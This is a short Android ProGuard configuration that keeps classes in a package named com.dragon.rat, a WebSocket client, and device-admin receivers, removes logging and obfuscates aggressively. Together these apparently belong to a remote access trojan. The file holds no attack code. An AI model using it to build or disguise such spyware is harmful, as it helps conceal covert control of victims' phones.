# Keep WebSocket client
-keep class org.java_websocket.** { *; }
-keep class com.dragon.rat.** { *; }

# Keep Gson
-keep class com.google.gson.** { *; }
-keepattributes Signature
-keepattributes *Annotation*

# Keep service and receiver classes
-keep class * extends android.app.Service { *; }
-keep class * extends android.content.BroadcastReceiver { *; }
-keep class * extends android.app.admin.DeviceAdminReceiver { *; }

# Remove logging in release
-assumenosideeffects class android.util.Log {
    public static boolean isLoggable(java.lang.String, int);
    public static int v(...);
    public static int d(...);
    public static int i(...);
    public static int w(...);
}

# Obfuscate everything except entry points
-optimizationpasses 5
-allowaccessmodification
-repackageclasses 'com.d'
-flattenpackagehierarchy
-overloadaggressively
